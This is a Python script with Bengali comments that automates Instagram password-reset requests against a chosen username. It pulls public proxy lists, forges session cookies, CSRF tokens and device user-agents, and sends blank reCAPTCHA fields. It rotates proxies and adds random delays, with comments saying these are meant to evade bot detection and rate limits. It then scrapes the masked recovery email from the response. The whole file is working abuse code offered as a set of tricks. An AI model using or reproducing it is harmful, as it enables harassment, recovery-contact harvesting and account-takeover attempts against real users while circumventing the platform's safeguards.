import httpx
import re
import random
import time
import uuid
import urllib.request
import json

# ==========================================
# 🚨 ট্রিক ১: ডাইনামিক লাইভ প্রক্সি লোডার
# ==========================================
def get_live_proxies():
    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    try:
        # যেকোনো একটি সোর্স থেকে লাইভ প্রক্সি লিস্ট আনা
        r = urllib.request.urlopen(random.choice(sources), timeout=5)
        proxies = r.read().decode('utf-8').split('\n')
        valid = [f"http://{p.strip()}" for p in proxies if ":" in p and len(p.strip()) > 5]
        return valid
    except:
        return []

# গ্লোবালি প্রক্সি লিস্ট সেভ করে রাখা
PROXY_POOL = get_live_proxies()

# ==========================================
# 🚨 ট্রিক ২: রিয়েল ডিভাইস এবং ব্রাউজার সিমুলেশন
# ==========================================
def generate_fake_session():
    # ফেক ইনস্টাগ্রাম সেশন জেনারেট
    mid = str(uuid.uuid4()).replace('-', '')[:28]
    csrf = str(uuid.uuid4())
    session_id = f"{random.randint(10,99)}%3A{random.randint(1000000000, 9999999999)}%3A{random.randint(10,99)}"
    return mid, csrf, session_id

def get_rotated_headers():
    mid, csrf, session_id = generate_fake_session()
    
    # ৩ ধরনের ডিভাইস সিমুলেশন
    devices = [
        f"Instagram 312.0.0.34.114 (iPhone; iOS 17.4; en_US; iPhone 15 Pro; iPhone16,1)",
        f"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    ]
    
    return {
        "User-Agent": random.choice(devices),
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1",
        "x-requested-with": "XMLHttpRequest",
        "x-csrftoken": csrf,
        "x-device-id": ''.join(random.choices('0123456789abcdef', k=16)),
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()}; mid={mid}; sessionid={session_id};",
        "Accept": "*/*",
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/accounts/password/reset/"
    }

URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

# ==========================================
# 🚨 ট্রিক ৩: মাল্টিপল রিট্রাই লজিক
# ==========================================
def send_reset(target):
    max_retries = 3
    payload = {
        "email_or_username": target,
        "flow": "fxcal",
        "recaptcha_challenge_field": "",
        "recaptcha_response_field": "manual_challenge"
    }

    for attempt in range(max_retries):
        # ট্রিক ৪: র‍্যান্ডম স্লিপ (বট ডিটেকশন এড়াতে)
        time.sleep(random.uniform(2.0, 4.5))
        
        proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
        mounts = {"http://": proxy, "https://": proxy} if proxy else None

        try:
            # HTTP/2 এবং ব্রাউজার ফিঙ্গারপ্রিন্ট
            with httpx.Client(http2=True, headers=get_rotated_headers(), proxies=mounts, timeout=15.0) as client:
                o = client.post(URL, data=payload)
                c = o.text.lower()
                
                # যদি রেট লিমিট আসে, লুপ চালিয়ে নতুন প্রক্সি দিয়ে আবার চেষ্টা করবে
                if o.status_code == 429 or "rate limit" in c:
                    print(f"[Attempt {attempt+1}] Rate Limited. Retrying with new proxy...")
                    continue # পরের লুপে যাবে
                
                # সফল রেসপন্স হ্যান্ডলিং
                ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', c)
                if ev: return f"email:{ev.group(0)}"
                    
                if "fail" in c or "no user found" in c: return "error:not_found"
                    
                return "phone"
                
        except httpx.ProxyError:
            print(f"[Attempt {attempt+1}] Proxy dead. Changing proxy...")
            continue # প্রক্সি ডেড হলে আবার ট্রাই করবে
        except Exception as e:
            if attempt == max_retries - 1:
                return f"error:{str(e)[:15]}"
            continue # অন্যান্য এরর হলেও আবার চেষ্টা করবে
            
    return "error:rate_limited" # ৩ বার চেষ্টার পরও ব্যর্থ হলে
